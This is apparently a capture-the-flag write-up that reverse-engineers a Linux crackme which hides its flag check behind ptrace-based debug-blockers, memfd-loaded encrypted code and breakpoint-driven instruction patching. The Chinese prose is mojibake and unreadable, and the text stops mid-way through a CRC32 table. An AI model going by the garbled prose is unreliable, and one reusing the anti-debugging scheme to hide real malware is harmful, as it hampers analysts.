<h2 id="2024-0xl4ughCTF-dance"><a href="#2024-0xl4ughCTF-dance" class="headerlink" title="[2024 0xl4ughCTF] dance"></a>[2024 0xl4ughCTF] dance</h2><p>å¯¹åº”Windowsçš„<code>WaitForDebugEvent</code>API Linuxæœ‰<code>ptrace</code>ç³»ç»Ÿè°ƒç”¨ åŒæ ·å¯ä»¥é…åˆ<code>fork()</code>æ¥åˆ›å»ºå­ç¨‹åºä»¥å®ç°Debug-Blocker è€Œä¸”ç›¸æ¯”Windowsç‰ˆæœ¬çš„ ä½¿ç”¨<code>ptrace</code>å°†ä½¿å¾—çˆ¶å­ç¨‹åºä¹‹é—´çš„æ•°æ®äº¤æµæ›´åŠ æ–¹ä¾¿ä¸”æ›´æ— æ‡ˆå¯å‡»</p>
<p>åœ¨ç€æ‰‹è§£å†³é¢˜ç›®å‰å…ˆç®€å•äº†è§£ä¸€ä¸‹<a href="https://man7.org/linux/man-pages/man2/ptrace.2.html"><code>ptrace</code></a>ç›¸å…³çš„çŸ¥è¯† ç®€å•æ¥è¯´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">long ptrace(enum __ptrace_request op, pid_t pid,</span><br><span class="line">                   void *addr, void *data);</span><br></pre></td></tr></table></figure>

<p>ä¼šæ ¹æ®ç¬¬1ä¸ªå‚æ•°<code>request</code>è¿›è¡Œä¸åŒçš„æ“ä½œ å¸¸ç”¨çš„æœ‰:</p>
<table>
<thead>
<tr>
<th>request</th>
<th>function</th>
<th>addr</th>
<th>data</th>
</tr>
</thead>
<tbody><tr>
<td>PTRACE_ATTACH</td>
<td>é™„åŠ åˆ°pidæ‰€æŒ‡çš„å­ç¨‹åºä¸Š</td>
<td>&#x2F;</td>
<td>&#x2F;</td>
</tr>
<tr>
<td>PTRACE_CONT</td>
<td>æ¢å¤å­ç¨‹åºçš„è¿è¡Œ</td>
<td>&#x2F;</td>
<td>è‹¥ä¼ å…¥éé›¶å€¼åˆ™ä¸ºå‘å­ç¨‹åºä¼ é€’çš„ä¿¡å·(SIGNAL)</td>
</tr>
<tr>
<td>PTRACE_GETREGS</td>
<td>è·å–å½“å‰å­ç¨‹åºå„ä¸ªå¯„å­˜å™¨çš„å€¼</td>
<td>&#x2F;</td>
<td>ä¸€ä¸ªæŒ‡å‘<code>struct user_regs_struct</code><a href="https://sites.uclouvain.be/SystInfo/usr/include/sys/user.h.html">ç±»å‹</a>çš„æŒ‡é’ˆç”¨äºå­˜æ”¾è·å–åˆ°çš„å¯„å­˜å™¨å€¼</td>
</tr>
<tr>
<td>PTRACE_SETREGS</td>
<td>è®¾ç½®å½“å‰å­ç¨‹åºå„ä¸ªå¯„å­˜å™¨çš„å€¼</td>
<td>&#x2F;</td>
<td>ä¸€ä¸ªæŒ‡å‘<code>struct user_regs_struct</code>ç±»å‹çš„æŒ‡é’ˆç”¨äºå­˜æ”¾è¦è®¾ç½®çš„å¯„å­˜å™¨å€¼</td>
</tr>
<tr>
<td>PTRACE_PEEKDATA</td>
<td>ä»å­ç¨‹åºaddræŒ‡å‘çš„åœ°å€è¯»å–1ä¸ªå­—(WORD)çš„æ•°æ®åˆ°dataæŒ‡å‘çš„åœ°å€ä¸­</td>
<td>è¦è¯»å–çš„åœ°å€</td>
<td>è¦å†™å…¥çš„åœ°å€</td>
</tr>
<tr>
<td>PTRACE_POKEDATA</td>
<td>ä»dataæŒ‡å‘çš„åœ°å€è¯»å–1ä¸ªå­—(WORD)çš„æ•°æ®åˆ°å­ç¨‹åºaddræŒ‡å‘çš„åœ°å€ä¸­</td>
<td>è¦å†™å…¥çš„åœ°å€</td>
<td>è¦è¯»å–çš„åœ°å€</td>
</tr>
</tbody></table>
<p>äº†è§£å®Œ<code>ptrace</code>åç®€å•è¯´æ˜ä¸€ä¸‹<code>fork</code> ç›¸è¾ƒäºWindowsä¸Šåˆ›å»ºæ–°è¿›ç¨‹ä»å¤´æ‰§è¡Œå†ä½¿ç”¨<code>IsDebuggerPresent</code>æ¥åˆ¤æ–­å­è¿›ç¨‹ <code>fork</code>åœ¨æ‰§è¡Œåç›´æ¥å°±åœ¨å¦ä¸€å—å†…å­˜åˆ›å»ºäº†ä¸€å—å¤§å¤šæ•°å±æ€§éƒ½ä¸çˆ¶è¿›ç¨‹ç›¸åŒçš„å­è¿›ç¨‹ è€Œåœ¨çˆ¶è¿›ç¨‹ä¸­<code>fork</code>è¿”å›äº†å­è¿›ç¨‹çš„pid åœ¨å­è¿›ç¨‹ä¸­è¿”å›äº†0</p>
<p>ç°åœ¨å†çœ‹é¢˜ç›® ä¸»å‡½æ•°(<code>ptrace</code>åŸæœ¬æ˜¯èŠ±æŒ‡ä»¤å®ç°çš„ ä¿®æ”¹å‡½æ•°å(æˆ<code>_ptrace</code>)åIDAå¯ä»¥ç›´æ¥æŠŠå®ƒå½“æˆç³»ç»Ÿè°ƒç”¨ ç¬¬ä¸€ä¸ªå‚æ•°ç”¨å®è¡¨ç¤ºäº† IDAä¼Ÿå¤§ IDAé—¨ğŸ™):</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **args, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> stat_loc; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">__pid_t</span> pid; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;usage: %s &lt;flag&gt;\n&quot;</span>, *args);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> ( !pid )</span><br><span class="line">    child(args[<span class="number">1</span>]);</span><br><span class="line">  ptrace(PTRACE_ATTACH, pid, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    waitpid(pid, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (stat_loc &amp; <span class="number">0x7F</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( stat_loc != <span class="number">0xFFFF</span> )</span><br><span class="line">      ptrace(PTRACE_CONT, pid, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€å±‚blockerçˆ¶è¿›ç¨‹æ²¡æœ‰æ ¹æ®å­è¿›ç¨‹çš„è¡Œä¸ºæ‰§è¡Œä»£ç  å•çº¯ä¸ºäº†åè°ƒè¯• å­è¿›ç¨‹:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">child</span><span class="params">(_BYTE *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">4</span>]; <span class="comment">// [rsp+10h] [rbp-310h] BYREF</span></span><br><span class="line">  _QWORD v3[<span class="number">24</span>]; <span class="comment">// [rsp+30h] [rbp-2F0h] BYREF</span></span><br><span class="line">  _BYTE v4[<span class="number">12</span>]; <span class="comment">// [rsp+F0h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">int</span> x; <span class="comment">// [rsp+FCh] [rbp-224h] BYREF</span></span><br><span class="line">  regs regs; <span class="comment">// [rsp+100h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">int</span> stat_loc; <span class="comment">// [rsp+1DCh] [rbp-144h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// [rsp+1E0h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v9; <span class="comment">// [rsp+2E0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 (__fastcall *func)(_BYTE *); <span class="comment">// [rsp+2E8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">void</span> *handle; <span class="comment">// [rsp+2F0h] [rbp-30h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+2F8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int32 crc32sum; <span class="comment">// [rsp+2FCh] [rbp-24h]</span></span><br><span class="line">  <span class="type">__pid_t</span> pid; <span class="comment">// [rsp+300h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> count; <span class="comment">// [rsp+304h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+308h] [rbp-18h]</span></span><br><span class="line">  __int64 addr; <span class="comment">// [rsp+310h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 ins_num; <span class="comment">// [rsp+318h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  addr = <span class="number">0LL</span>;</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> ( !pid )</span><br><span class="line">  &#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    fd = memfd_create(&amp;unk_3004, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd);</span><br><span class="line">    qmemcpy(v2, <span class="string">&quot;Hello, that is one key for you..&quot;</span>, <span class="keyword">sizeof</span>(v2));</span><br><span class="line">    qmemcpy(v4, <span class="string">&quot;nice_move_:)&quot;</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">    sub_23FA(v3, (__int64)v2, (__int64)v4, <span class="number">0LL</span>);<span class="comment">// chacha20</span></span><br><span class="line">    sub_246D((__int64)v3, (__int64)fin, len);</span><br><span class="line">    <span class="keyword">for</span> ( n = len; (__int64)n &gt; <span class="number">0</span>; n -= v9 )</span><br><span class="line">      v9 = write(fd, &amp;fin[len - n], n);</span><br><span class="line">    handle = dlopen(s, <span class="number">2</span>);</span><br><span class="line">    func = (<span class="type">unsigned</span> __int8 (__fastcall *)(_BYTE *))dlsym(handle, <span class="string">&quot;dance_with_me&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( func(input) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;nop&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    dlclose(handle);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ptrace(PTRACE_ATTACH, pid, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    waitpid(pid, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">    result = stat_loc &amp; <span class="number">0x7F</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (stat_loc &amp; <span class="number">0x7F</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( stat_loc != <span class="number">0xFFFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)stat_loc == <span class="number">127</span> &amp;&amp; (stat_loc &amp; <span class="number">0xFF00</span>) == <span class="number">0x500</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ins_num &amp;&amp; addr )</span><br><span class="line">          write_code(pid, addr, int_3, ins_num);</span><br><span class="line">        ptrace(PTRACE_GETREGS, pid, <span class="number">0LL</span>, &amp;regs);</span><br><span class="line">        x = (LOWORD(regs.rip) - <span class="number">1</span>) &amp; <span class="number">0xFFF</span>;</span><br><span class="line">        crc32sum = ~crc32(&amp;x, <span class="number">4LL</span>);</span><br><span class="line">        count = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          ++count;</span><br><span class="line">        <span class="keyword">while</span> ( crc32sum != inss[count].crc32s &amp;&amp; inss[count].crc32s );</span><br><span class="line">        write_code(pid, regs.rip - <span class="number">1</span>, inss[count].code, (<span class="type">unsigned</span> __int8)inss[count].ins_num);</span><br><span class="line">        ins_num = (<span class="type">unsigned</span> __int8)inss[count].ins_num;</span><br><span class="line">        addr = --regs.rip;</span><br><span class="line">        ptrace(PTRACE_SETREGS, pid, <span class="number">0LL</span>, &amp;regs);</span><br><span class="line">      &#125;</span><br><span class="line">      ptrace(PTRACE_CONT, pid, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒå±‚blocker å¯ä»¥çœ‹åˆ°å­è¿›ç¨‹çš„æµç¨‹æ¯”è¾ƒæ¸…æ™° åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„æ–‡ä»¶æè¿°ç¬¦å¹¶å†™å…¥äº†ä¸€ä¸ªåº“ä»¥ä¾›åŠ¨æ€åŠ è½½å…¶ä¸­çš„checkå‡½æ•° ç¨åå†è§£é‡Šçˆ¶è¿›ç¨‹è¡Œä¸º</p>
<p>è¿™é‡Œå°è¯•è°ƒè¯•ä¿®æ”¹forkè¿”å›å€¼æ¥è·å–å†™å…¥çš„åº“ ä½†æ˜¯å…¶ä¸­éƒ½æ˜¯<code>INT 3</code>ä¸­æ–­æŒ‡ä»¤:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F01%2F26%2F20250126-214239.png" alt="image-20250126214231954"></p>
<p>é‚£ä¹ˆè‚¯å®šæ˜¯çˆ¶è¿›ç¨‹åŠ¨æ€patchäº†è¿™ä¸ªåº“ æ¥ä¸‹æ¥æˆ‘å°è¯•å°†<code>puts(&#39;nop&#39;);</code>çš„å¤±è´¥åˆ¤æ–­patchæˆæ— é™å¾ªç¯ ç„¶åå†æ‰‹åŠ¨killæ‰çˆ¶è¿›ç¨‹å†é™„åŠ è°ƒè¯•å­è¿›ç¨‹æ¥æŸ¥çœ‹checkå‡½æ•° ä½†æ˜¯è¿˜æ˜¯å¤±è´¥äº† ç¨‹åºè¾“å‡ºäº†<code>i&#39;m dead</code>åç›´æ¥é€€å‡º </p>
<p>æ¥ä¸‹æ¥åªèƒ½ç¡¬åˆ†æçˆ¶è¿›ç¨‹è¡Œä¸ºäº† åªçœ‹å…¶ä¸­æœ€æ ¸å¿ƒçš„ç‰‡æ®µ:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> ( ins_num &amp;&amp; addr )</span><br><span class="line">  write_code(pid, addr, int_3, ins_num);</span><br><span class="line">ptrace(PTRACE_GETREGS, pid, <span class="number">0LL</span>, &amp;regs);</span><br><span class="line">x = (LOWORD(regs.rip) - <span class="number">1</span>) &amp; <span class="number">0xFFF</span>;</span><br><span class="line">crc32sum = ~crc32(&amp;x, <span class="number">4LL</span>);</span><br><span class="line">count = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  ++count;</span><br><span class="line"><span class="keyword">while</span> ( crc32sum != inss[count].crc32s &amp;&amp; inss[count].crc32s );</span><br><span class="line">write_code(pid, regs.rip - <span class="number">1</span>, inss[count].code, (<span class="type">unsigned</span> __int8)inss[count].ins_num);</span><br><span class="line">ins_num = (<span class="type">unsigned</span> __int8)inss[count].ins_num;</span><br><span class="line">addr = --regs.rip;</span><br><span class="line">ptrace(PTRACE_SETREGS, pid, <span class="number">0LL</span>, &amp;regs);</span><br><span class="line">...</span><br><span class="line">__int64 __fastcall <span class="title function_">write_code</span><span class="params">(<span class="type">int</span> pid, __int64 addr, _BYTE *ins, <span class="type">unsigned</span> __int64 ins_num)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// r8</span></span><br><span class="line">  __int64 v5; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  _BYTE *v10; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  _BYTE *v14; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  _BYTE *v16; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v18; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = pid;</span><br><span class="line">  v11 = addr;</span><br><span class="line">  v10 = ins;</span><br><span class="line">  v9 = ins_num;</span><br><span class="line">  v18 = ins_num &amp; <span class="number">7</span>;</span><br><span class="line">  v17 = ins_num &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  v16 = ins;</span><br><span class="line">  <span class="keyword">for</span> ( i = addr; v17--; i += <span class="number">8LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ptrace(PTRACE_POKEDATA, v12, i, *(_QWORD *)v16) == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    v16 += <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v18 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v14 = &amp;v13;</span><br><span class="line">  ptrace(PTRACE_PEEKDATA, v12, i, &amp;v13);</span><br><span class="line">  <span class="keyword">if</span> ( v13 == <span class="number">-1</span> &amp;&amp; *__errno_location() )</span><br><span class="line">  &#123;</span><br><span class="line">    i += v18 - <span class="number">8</span>;</span><br><span class="line">    ptrace(PTRACE_PEEKDATA, v12, i, &amp;v13);</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">-1</span> &amp;&amp; *__errno_location() )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    v14 += <span class="number">8</span> - v18;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v18-- )</span><br><span class="line">    v14[v18] = v16[v18];</span><br><span class="line">  <span class="keyword">if</span> ( ptrace(PTRACE_POKEDATA, v12, i, v13) != <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­æ ¹æ®å†…å­˜ç‰¹ç‚¹å®šä¹‰äº†ä¸€ä¸ªç»“æ„ä½“ ä¹Ÿå°±æ˜¯inssçš„ç±»å‹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F01%2F26%2F20250126-214815.png" alt="image-20250126214815048"></p>
<p>ç»“åˆ<code>write_code()</code>çš„å†…å®¹å¤§è‡´æ¨æ–­çˆ¶è¿›ç¨‹çš„è¡Œä¸º:</p>
<p>å½“å­è¿›ç¨‹å‘ç”Ÿå¼‚å¸¸æ—¶ç”¨ä¸€ä¸ªç±»ä¼¼CRC32çš„å“ˆå¸Œå‡½æ•°è®¡ç®—å¼‚å¸¸å‘ç”Ÿç‚¹çš„å†…å­˜åœ°å€ä½3ä½åå…­è¿›åˆ¶çš„å“ˆå¸Œå€¼ ç„¶åå†åœ¨<code>inss</code>ä¸­æŸ¥æ‰¾è¿™ä¸ªhash å¦‚æœæ‰¾åˆ°çš„è¯å‘å¼‚å¸¸å‘ç”Ÿç‚¹å†™å…¥æŒ‡ä»¤ åœ¨ä¸‹ä¸€è½®å¼€å¤´å†å‘å¼‚å¸¸å‘ç”Ÿç‚¹å†™å…¥<code>INT 3</code>æŒ‡ä»¤è¾¾åˆ°æ— ç—•æ‰§è¡Œçš„ç›®çš„</p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥çš„å·¥ä½œå°±æ˜¯è¿˜åŸåº“:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CRC32_table = [<span class="number">0x00000000</span>, <span class="number">0x77073096</span>, <span class="number">0xEE0E612C</span>, <span class="number">0x990951BA</span>, <span class="number">0x076DC419</span>, <span class="number">0x706AF48F</span>, <span class="number">0xE963A535</span>, <span class="number">0x9E6495A3</span>, <span class="number">0x0EDB8832</span>, <span class="number">0x79DCB8A4</span>, <span class="number">0xE0D5E91E</span>, <span class="number">0x97D2D988</span>, <span class="number">0x09B64C2B</span>, <span class="number">0x7EB17CBD</span>, <span class="number">0xE7B82D07</span>, <span class="number">0x90BF1D91</span>, <span class="number">0x1DB71064</span>, <span class="number">0x6AB020F2</span>, <span class="number">0xF3B97148</span>, <span class="number">0x84BE41DE</span>, <span class="number">0x1ADAD47D</span>, <span class="number">0x6DDDE4EB</span>, <span class="number">0xF4D4B551</span>, <span class="number">0x83D385C7</span>, <span class="number">0x136C9856</span>, <span class="number">0x646BA8C0</span>, <span class="number">0xFD62F97A</span>, <span class="number">0x8A65C9EC</span>, <span class="number">0x14015C4F</span>, <span class="number">0x63066CD9</span>, <span class="number">0xFA0F3D63</span>, <span class="number">0x8D080DF5</span>, <span class="number">0x3B6E20C8</span>, <span class="number">0x4C69105E</span>, <span class="number">0xD56041E4</span>, <span class="number">0xA2677172</span>, <span class="number">0x3C03E4D1</span>, <span class="number">0x4B04D447</span>, <span class="number">0xD20D85FD</span>, <span class="number">0xA50AB56B</span>, <span class="number">0x35B5A8FA</span>, <span class="number">0x42B2986C</span>, <span class="number">0xDBBBC9D6</span>, <span class="number">0xACBCF940</span>, <span class="number">0x32D86CE3</span>, <span class="number">0x45DF5C75</span>, <span class="number">0xDCD60DCF</span>, <span class="number">0xABD13D59</span>, <span class="number">0x26D930AC</span>, <span class="number">0x51DE003A</span>, <span class="number">0xC8D75180</span>, <span class="number">0xBFD06116</span>, <span class="number">0x21B4F4B5</span>, <span class="number">0x56B3C423</span>, <span class="number">0xCFBA9599</span>, <span class="number">0xB8BDA50F</span>, <span class="number">0x2802B89E</span>, <span class="number">0x5F058808</span>, <span class="number">0xC60CD9B2</span>, <span class="number">0xB10BE924</span>, <span class="number">0x2F6F7C87</span>, <span class="number">0x58684C11</span>, <span class="number">0xC1611DAB</span>, <span class="number">0xB6662D3D</span>, <span class="number">0x76DC4190</span>, <span class="number">0x01DB7106</span>, <span class="number">0x98D220BC</span>, <span class="number">0xEFD5102A</span>, <span class="number">0x71B18589</span>, <span class="number">0x06B6B51F</span>, <span class="number">0x9FBFE4A5</span>, <span class="number">0xE8B8D433</span>, <span class="number">0x7807C9A2</span>, <span class="number">0x0F00F934</span>, <span class="number">0x9609A88E</span>, <span class="number">0xE10E9818</span>, <span class="number">0x7F6A0DBB</span>, <span class="number">0x086D3D2D</span>, <span class="number">0x91646C97</span>, <span class="number">0xE6635C01</span>, <span class="number">0x6B6B51F4</span>, <span class="number">0x1C6C6162</span>, <span class="number">0x856530D8</span>, <span class="number">0xF262004E</span>, <span class="number">0x6C0695ED</span>, <span class="number">0x1B01A57B</span>, <span class="number">0x8208F4C1</span>, <span class="number">0xF50FC457</span>, <span class="number">0x65B0D9C6</span>, <span class="number">0x12B7E950</span>, <span class="number">0x8BBEB8EA</span>, <span class="number">0xFCB9887C</span>, <span class="number">0x62DD1DDF</span>, <span class="number">0x15DA2D49</span>, <span class="number">0x8CD37CF3</span>, <span class="number">0xFBD44C65</span>, <span class="number">0x4DB26158</span>, <span class="number">0x3AB551CE</span>, <span class="number">0xA3BC0074</span>, <span class="number">0xD4BB30E2</span>, <span class="number">0x4ADFA541</span>, <span class="number">0x3DD895D7</span>, <span class="number">0xA4D1C46D</span>, <span class="number">0xD3D6F4FB</span>, <span class="number">0x4369E96A</span>, <span class="number">0x346ED9FC</span>, <span class="number">0xAD678846</span>, <span class="number">0xDA60B8D0</span>, <span class="number">0x44042D73</span>, <span class="number">0x33031DE5</span>, <span class="number">0xAA0A4C5F</span>, <span class="number">0xDD0D7CC9</span>, <span class="number">0x5005713C</span>, <span class="number">0x270241AA</span>, <span class="number">0xBE0B1010</span>, <span class="number">0xC90C2086</span>, <span class="number">0x5768B525</span>, <span class="number">0x206F85B3</span>, <span class="number">0xB966D409</span>, <span class="number">0xCE61E49F</span>, <span class="number">0x5EDEF90E</span>, <span class="number">0x29D9C998</span>, <span class="number">0xB0D09822</span>, <span class="number">0xC7D7A8B4</span>, <span class="number">0x59B33D17</span>, <span class="number">0x2EB40D81</span>, <span class="number">0xB7BD5C3B</span>, <span class="number">0xC0BA6CAD</span>, <span class="number">0xEDB88320</span>, <span class="number">0x9ABFB3B6</span>, <span class="number">0x03B6E20C</span>, <span class="number">0x74B1D29A</span>, <span class="number">0xEAD54739</span>, <span class="number">0x9DD277AF</span>, <span class="number">0x04DB2615</span>, <span class="number">0x73DC1683</span>, <span class="number">0xE3630B12</span>, <span class="number">0x94643B84</span>, <span class="number">0x0D6D6A3E</span>, <span class="number">0x7A6A5AA8</span>, <span class="number">0xE40ECF0B</span>, <span class="number">0x9309FF9D</span>, <span class="number">0x0A00AE27</span>, <span class="number">0x7D079EB1</span>, <span class="number">0xF00F9344</span>, <span class="number">0x8708A3D2</span>, <span class="number">0x1E01F268</span>, <span class="number">0x6906C2FE</span>, <span class="number">0xF762575D</span>, <span class="number">0x806567CB</span>, <span class="number">0x196C3671</span>, <span class="number">0x6E6B06E7</span>, <span class="number">0xFED41B76</span>, <span class="number">0x89D32BE0</span>, <span class="number">0x10DA7A5A</span>, <span class="number">0x67DD4ACC</span>, <span class="number">0xF9B9DF6F</span>, <span class="number">0x8EBEEFF9</span>, <span class="number">0x17B7BE43</span>, <span class="number">0x60B08ED5</span>, <span class="number">0xD6D6A3E8</span>, <span class="number">0xA1D1937E</span>, <span class="number">0x38D8C2C4</span>, <span class="number">0x4FDFF252</span>, <span class="number">0xD1BB67F1</span>, <span class="number">0xA6BC5767</span>, <span class="number">0x3FB506DD</span>, <span class="number">0x48B2364B</span>, <span class="number">0xD80D2BDA</span>, <span class="number">0xAF0A1B4C</span>, <span class="number">0x36034AF6</span>, <span class="number">0x41047A60</span>, <span class="number">0xDF60EFC3</span>, <span class="number">0xA867DF55</span>, <span class="number">0x316E8EEF</span>, <span class="number">0x4669BE79</span>, <span class="number">0xCB61B38C</span>, <span class="number">0xBC66831A</span>, <span class="number">0x256FD2A0</span>, <span class="number">0x5268E236</span>, <span class="number">0xCC0C7795</span>, <span class="number">0xBB0B4703</span>, <span class="number">0x220216B9</span>, <span class="number">0x5505262F</span>, <span class="number">0xC5BA3BBE</span>, <span class="number">0xB2BD0B28</span>, <span class="number">0x2BB45A92</span>, <span class="number">0x5CB36A04</span>, <span class="number">0xC2D7FFA7</span>, <span class="number">0xB5D0CF31</span>, <span class="number">0x2CD99E8B</span>, <span class="number">0x5BDEAE1D</span>, <span class="number">0x9B64C2B0</span>, <span class="number">0xEC63F226</span>, <span class="number">0x756AA39C</span>, <span class="number">0x026D930A</span>, <span class="number">0x9C0906A9</span>, <span class="number">0xEB0E363F</span>, <span class="number">0x72076785</span>, <span class="number">0x05005713</span>, <span class="number">0x95BF4A82</span>, <span class="number">0xE2B87A14</span>, <span class="number">0x7BB12BAE</span>, <span class="number">0x0CB61B38</span>, <span class="number">0x92D28E9B</span>, <span class="number">0xE5D5BE0D</span>, <span class="number">0x7CDCEFB7</span>, <span class="number">0x0BDBDF21</span>, <span class="number">0x86D3D2D4</span>, <span class="number">0xF1D4E242</span>, <span class="number">0x68DDB3F8</span>, <span class="number">0x1FDA836E</span>, <span class="number">0x81BE16CD</span>, <span class="number">0xF6B9265B</span>, <span class="number">0x6FB077E1</span>, <span class="number">0x18B74777</span>, <span class="number">0x88085AE6</span>, <span class="number">0xFF0F6A70</span>, <span class="number">0x66063BCA</span>, <span class="number">0x11010B5C</span>, <span class="number">0x8F659EFF</span>, <span class="number">0xF862AE69</span>, <span class="number">0x616BFFD3</span>, <span class="number">0x166CCF45</span>, <span class="number">0xA00AE278</span>, <span class="number">0xD70DD2EE</span>, <span class="number">0x4E048354</span>, <span class="number">0x3903B3C2</span>, <span class="number">0xA7672661</span>, <span class="number">0xD06016F7</span>, <span class="number">0x4969474D</span>, <span class="number">0x3E6E77DB</span>, <span class="number">0xAED16A4A</span>, <span class="number">0xD9D65ADC</span>, <span class="number">0x40DF0B66</span>, <span class="number">0x37D83BF0</span>, <span class="number">0xA9BCAE53</span>, <span class="number">0xDEBB9EC5</span>, <span class="number">0x47B2CF7F</span>, <span class="number">0x30B5FFE9</span>, <span class="number">0xBDBDF21C</span>, <span 